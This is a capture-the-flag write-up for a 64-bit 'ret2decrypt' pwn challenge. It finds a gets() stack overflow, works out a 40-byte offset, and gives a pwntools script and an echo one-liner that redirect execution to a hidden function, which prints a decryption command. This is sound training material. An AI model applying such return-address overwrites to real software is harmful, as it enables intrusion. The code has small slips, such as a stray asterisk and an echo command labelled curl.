ret2decrypt | CTF Challenge Writeup  

    - Category: Pwn
    - Score: 100  

Challenge: [Download](https://github.com/Debang5hu/ctf-writeups/blob/main/challenges/Ret2Decrypt/challenge.zip)  

Exploit a buﬀer overﬂow in a 64-bit binary to redirect execution and trigger a hidden function. Use the decryption command revealed to unlock the contents of flag.txt and retrieve the ﬂag.  

The challenge include 3 ﬁles namely __x64__ , __decrypt__ and __ﬂag.txt__  

- `x64`: The vulnerable binary with a Buﬀer Overﬂow (BoF).  
- `decrypt`: A helper binary used for decryption.
- `flag.txt`: The ﬁle containing the ﬂag, which we need to unlock.  

Let’s dive in!  

#### Recon

We start oﬀ by analyzing the provided binary ﬁle (x64) to gather basic information about its structure and functionality.  

1. File Type:  

Using `file x64`, we conﬁrm that the binary is an ELF 64-bit executable. This gives us information about the architecture (x64).  

```sh
~/Ret2Decrypt$ file x64
x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ad0fed2fcae3629a2b5e67b3fd5d4c38f7fa68ff, for GNU/Linux 3.2.0, not stripped
```  

2. Strings:  

We run strings x64 to extract any useful text from the binary. The output includes standard function names and some other strings, but nothing particularly out of the ordinary or immediately useful. This suggests that the binary isn't obfuscated or hiding any critical information.  

<img width="421" height="513" alt="strings" src="https://github.com/user-attachments/assets/cf421075-fa8f-4702-86b3-fadb5cc5f4f5" />  


3. Execution Behavior:  

When we run the binary:  

<img width="396" height="112" alt="exe" src="https://github.com/user-attachments/assets/cb26f4b0-56b8-4df2-92ba-85f76094c72d" />  


The program simply waits for input and terminates without providing feedback. This suggests the program may have a vulnerability, speciﬁcally a buﬀer overﬂow, allowing us to manipulate its execution ﬂow.  


4. Debugging and Further Inspection:  

To investigate the vulnerability further, we open the binary in a debugger (using tools like gdb or pwndbg). By inspecting the program’s function calls and disassembling the binary, we identify several key functions:  

- main()
- imposter()
- x()  

<img width="505" height="448" alt="info" src="https://github.com/user-attachments/assets/bf39ad2f-323c-4f8f-ac9c-440ea8c80088" />

#### Exploitation  

Upon disassembling the `main` function, We notice that `imposter()` is responsible for taking user input. This is the likely location of the vulnerability.  


<img width="760" height="548" alt="disas" src="https://github.com/user-attachments/assets/5fdc5dd4-1571-4284-b4a0-e5bda102a9da" />  


Decompiling the `imposter()` function using ghidra,  

<img width="227" height="170" alt="gets" src="https://github.com/user-attachments/assets/0068877a-52b3-45b5-a676-c1a6a650aa2e" />  

The `imposter()` function contains a buﬀer overﬂow due to the use of the unsafe __gets()__ function. This vulnerability allows us to overwrite the return address of the function.  

Now, Lets inspect what does x() function do.  

<img width="279" height="214" alt="x" src="https://github.com/user-attachments/assets/d39c4ed6-1b59-4542-aeec-e5f33329d8f0" />   

Basically, this function is printing a string that is stored in memory.  

Therefore, By overﬂowing the stack, we can ﬁrst re-enter the `imposter()` function and then redirect the execution ﬂow to the `x()` function, which will output the decryption command.  

Now to get the entry address of the functions: `print &func_name`  

<img width="615" height="134" alt="addr" src="https://github.com/user-attachments/assets/a1299dfe-c842-4adb-8bc8-aff76bbbbe03" />

> Stack Layout:  

- The return address is 8 bytes (since we are on a 64-bit system).  
- The buﬀer used to read input is 32 bytes.
- The saved frame pointer (SFP) is 8 bytes.

To overwrite the return address, we need a total of 40 bytes: 32 bytes to ﬁll the buﬀer, 8 bytes for the saved frame pointer.  


> Exploit Flow: 

- First Overﬂow: Overwrite the return address of `imposter()` with `0x40118c` to re-enter `imposter()` and trigger the overﬂow again.
- Purpose: This forces the program to “re-enter” the vulnerable `imposter()` function again after the overﬂow, which ensures that the stack is properly set up and that we can perform a second stage of the exploit. It eﬀectively sets up the stack for the next step.  
- Second Overﬂow: After re-entering `imposter()`, overwrite the return address with the address of `x()` (0x401146).  
- Execution: The program will jump to `x()`, which prints the decryption command.  


```python
# payload = padding + imposter() addr + x() addr
payload = b'a' * 40 + p64(0x40118c) + p64(0x401146)
```  

- b'a' * 40: This is the padding that ﬁlls the buﬀer.
- p64(0x40118c): This is the address of `imposter()`, where the program will jump ﬁrst.
- p64(0x401146): This is the address of `x()`, where the program will jump after re-entering `imposter()`.  


#### PoC  

Once we have crafted the payload, we can exploit the binary. Here are two methods of triggering the exploit.  

1. Using Python:

```python3
#!/usr/bin/python3

from pwn import *

def exploit(exe):
    # init
    p = process(exe)
    context.binary = exe

    # create payload
    payload = b'a' * 40 + p64(0x40118c) + p64(0x401146)
    print(f'[+] Payload: {payload}')*

    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    exploit('x64')
```  

2. Using Curl:

```sh
echo -ne 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x8c\x11@\x00\x00\x00\x00\x00F\x11@\x00\x00\x00\x00\x00' | ./x64
```  

After successfully exploiting the vulnerability, the x() function will print a decryption command. We then use the decrypt binary to decrypt theflag.txt ﬁle and cat it to retrieve the ﬂag!  


#### Conclusion

That’s it! By exploiting the buﬀer overﬂow vulnerability in x64, we were able to redirect execution and trigger the hidden function `x()`, which revealed the decryption command for unlocking `flag.txt` and retrieving the ﬂag.  


Sayonara!!!  